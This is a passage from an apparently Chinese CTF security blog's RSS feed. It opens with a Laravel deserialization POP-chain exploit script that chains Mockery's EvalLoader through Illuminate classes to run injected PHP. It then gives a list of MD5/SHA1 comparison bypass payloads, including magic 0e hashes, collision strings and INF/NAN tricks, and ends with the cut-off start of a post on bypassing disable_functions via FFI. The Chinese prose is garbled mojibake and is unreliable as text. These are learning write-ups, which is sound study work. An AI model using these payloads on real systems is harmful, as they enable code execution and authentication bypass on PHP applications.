&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰§è¡Œæ•ˆæœï¼ˆç›–äº†ä¸€å±‚laravelæŠ¥é”™çš„åº•è‰²å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
&lt;p>è¿™ä¸ªé“¾å­éå¸¸çš„é•¿ï¼Œæ¶‰åŠåˆ°6ä¸ªç±»&lt;/p>
&lt;hr>
&lt;p>popé“¾æ€æˆ‘ï¼ï¼ï¼çœ‹ä»£ç æœ‰ç§ç›®å®³çš„æ„Ÿè§‰äº†&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1">Laravel POPé“¾ç®€æ &lt;/a> | &lt;a href="https://xz.aliyun.com/t/5911">Laravel5.8.xååºåˆ—åŒ–POPé“¾&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>md5æ¯”è¾ƒå¸¸è§ç»•è¿‡å°ç»“</title><link>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</link><pubDate>Fri, 03 Dec 2021 00:24:56 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</guid><description>&lt;blockquote>
&lt;p>&lt;strong>&lt;u>å†™åœ¨å¼€å¤´ï¼š&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>åˆ«çº ç»“&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>å·¦ä¾§çš„ç¬¦å·åè½¬&amp;amp;æ ‡é¢˜æ˜¯ä¸­æ–‡å¼•å·&amp;amp;æœ‰äº›ç¬¦å·æ¶ˆå¤±&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>çš„é—®é¢˜&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>æˆ‘ä¹Ÿå¾ˆæ— è¯­&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>å¯„ã€‚&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;ul>
&lt;li>
&lt;pre tabindex="0">&lt;code>md5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>sha1ç»•è¿‡å’Œmd5ç»•è¿‡æ–¹å¼æ˜¯ä¸€æ ·çš„&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="md5amd5b--ab">md5($a)==md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>0eç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>IHKFRNS -&amp;gt; 0e256160682445802696926137988570
QLTHNDT -&amp;gt; 0e405967825401955372549139051580
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
3908336290 -&amp;gt; 0e807624498959190415881248245271
4011627063 -&amp;gt; 0e485805687034439905938362701775
4775635065 -&amp;gt; 0e998212089946640967599450361168
0e215962017 -&amp;gt; 0e291242476940776845150308577824
aabg7XSs -&amp;gt; 0e087386482136013740957780965295
aabC9RqS -&amp;gt; 0e041022518165728065344349536299
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
240610708 -&amp;gt; 0e462097431906509019562988736854
&lt;/code>&lt;/pre>&lt;p>md5ç¢°æ’&lt;/p>
&lt;pre tabindex="0">&lt;code>a=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP
b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab">md5($a)==md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>a=&amp;amp;b[]=1
&lt;/code>&lt;/pre>&lt;h2 id="md5string_getamd5md5string_getb--ab">md5((string)$_GET[&amp;lsquo;a&amp;rsquo;])==md5(md5((string)$_GET[&amp;lsquo;b&amp;rsquo;])) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>0eç»•è¿‡ï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸0eï¼Œä¸€ä¸ªæ˜¯ç¬¬äºŒæ¬¡md5åè¿˜ä¸º0eçš„å¥‡è‘©å€¼&lt;/p>
&lt;pre tabindex="0">&lt;code>aawBzC
aabsbm9
aaaabGG5T
aaaabKGVH
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ctype_alphaa--is_numericb">md5($a)==md5($b) &amp;amp;&amp;amp; !ctype_alpha($a) &amp;amp;&amp;amp; !is_numeric($b)&lt;/h2>
&lt;p>0eç»•è¿‡ï¼Œä¸€ä¸ªçº¯æ•°å­—ä¸€ä¸ªçº¯å­—æ¯&lt;/p>
&lt;pre tabindex="0">&lt;code>240610708 -&amp;gt; 0e462097431906509019562988736854
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab">md5($a)===md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5md5b--ab-1">md5($a)===md5(md5($b)) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b----ab-1">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b&lt;/h2>
&lt;p>æ•°ç»„ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="ahashmd4a">$a!=hash(&amp;ldquo;md4&amp;rdquo;,$a)&lt;/h2>
&lt;p>0eçº¯æ•°å­—ç»•è¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;0e&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$md4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">hash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/^0e[0-9]*$/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4åŠ å¯†å‰:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md4åŠ å¯†åï¼š&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$md4&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
&lt;/code>&lt;/pre>&lt;h2 id="md5amd5b--ab--strlena3--strlenb3">md5($a)===md5($b) &amp;amp;&amp;amp; $a!==$b &amp;amp;&amp;amp; strlen($a)&amp;lt;=3 &amp;amp;&amp;amp; strlen($b)&amp;lt;=3&lt;/h2>
&lt;p>INFè¡¨ç¤ºæ— ç©·å¤§ï¼Œè€ŒNANè¡¨ç¤ºä¸€ä¸ªåœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­æœªå®šä¹‰æˆ–ä¸å¯è¡¨è¿°çš„å€¼ï¼›é™¤äº†ä¸Trueä¹‹å¤–ï¼Œæ‹¿NANä¸å…¶ä»–ä»»ä½•å€¼è¿›è¡Œæ¾æ•£æ¯”è¾ƒæˆ–è€…ä¸¥æ ¼æ¯”è¾ƒè¿”å›ç»“æœéƒ½æ˜¯FALSE
å› ä¸ºä»–ä»¬éƒ½æ˜¯ä¸ç¡®å®šçš„å€¼ï¼Œæ‰€ä»¥åœ¨ä¸è‡ªèº«åšæ¯”è¾ƒæ—¶ï¼Œä¼šè¿”å›false&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030175015724.png" alt="image-20211030175015724">&lt;/p>
&lt;p>INFå’ŒNANç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>a=INF&amp;amp;b=INF
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>a=NAN&amp;amp;b=NAN
&lt;/code>&lt;/pre>&lt;h2 id="this-syc--this-lover--md5this-syc--md5this-lover--sha1this-syc-sha1this-lover">($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover))&lt;/h2>
&lt;p>åšé¢˜é‡åˆ°çš„&lt;/p>
&lt;p>ç”¨åŸç”Ÿç±»&lt;code>Error&lt;/code>ï¼ˆphp7ï¼‰æˆ–&lt;code>Exception&lt;/code>ï¼ˆphp5 or 7ï¼‰ï¼Œå®ƒæœ‰&lt;code>__toString&lt;/code>æ–¹æ³•ï¼Œè¢«è§¦å‘åä¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºå½“å‰ä¿å­˜æƒ…å†µï¼ŒåŒ…æ‹¬é”™è¯¯ä¿¡æ¯å’Œå½“å‰æŠ¥é”™çš„è¡Œå·ï¼Œè€Œè·Ÿä¼ å…¥çš„å‚æ•°æ²¡æœ‰å…³ç³»ï¼›æ‰€ä»¥è¯´å¯ä»¥æ„é€ ä¸¤ä¸ªç±»çš„å®ä¾‹ï¼Œå®ƒä»¬è¡Œå·ç›¸åŒï¼ˆè¢«&lt;code>__toString&lt;/code>è°ƒç”¨åè¾“å‡ºä¿¡æ¯ä¸€æ ·ï¼‰ï¼Œä½†æ˜¯æœ¬èº«ä¸ç›¸åŒï¼ˆä¼ å…¥å‚æ•°ä¸ç­‰ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// è¿™ä¸ªä¸é‡è¦ æ˜¯é‚£ä¸ªé¢˜çš„payload
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„$aå’Œ$bå†™åˆ°ä¸€è¡Œ&lt;/p>
&lt;h2 id="this-token--this-token_flag">$this-&amp;gt;token === $this-&amp;gt;token_flag&lt;/h2>
&lt;p>æŒ‡é’ˆå–åœ°å€ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>$F-&amp;gt;token=&amp;amp;$F-&amp;gt;token_flag;
&lt;/code>&lt;/pre></description></item><item><title>FFIç»•è¿‡disable_functions</title><link>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</link><pubDate>Fri, 03 Dec 2021 00:01:07 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/</guid><description>&lt;p>åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥è¿›å…¥æ­£é¢˜ï¼›æ–‡ä¸­å‚è€ƒé“¾æ¥ç»Ÿä¸€æ‰”åé¢äº†&lt;/p>
&lt;h2 id="preloading">Preloading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | php7.4å¯ç”¨&lt;/li>
&lt;/ul>
&lt;p>é¢„åŠ è½½æ–‡ä»¶åˆ°opcacheä¸­ï¼Œç±»ä¸èƒ½æœ‰ä¸å¯è¾¾çš„çˆ¶ç±»ã€æ¥å£ï¼Œalso only top-level entities are not nested with control structures (e.g. if()&amp;hellip;)may be preloadedï¼›è¢«åŠ è½½åé™¤éé‡å¯ï¼Œè¿›è¡Œçš„ä¿®æ”¹ä¸å½±å“å½“å‰è¿›ç¨‹ï¼›é¢„åŠ è½½ä¸å½±å“é™æ€ç±»æˆå‘˜å’Œå˜é‡çš„è¡¨ç°ï¼›Windowsä¸­ä¸èƒ½é¢„åŠ è½½ä»å†…éƒ¨ç»§æ‰¿çš„ç±»ï¼ˆWindows ASLR and absence of fork() don&amp;rsquo;t allow to guarantee the same addresses of internal classes in different processes.ï¼‰ï¼›å¤šç‰ˆæœ¬æœ‰å¯èƒ½é€ æˆbug&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202161008294.png" alt="image-20211202161008294">&lt;/p>
&lt;h2 id="ffi">FFI&lt;/h2>
&lt;ul>
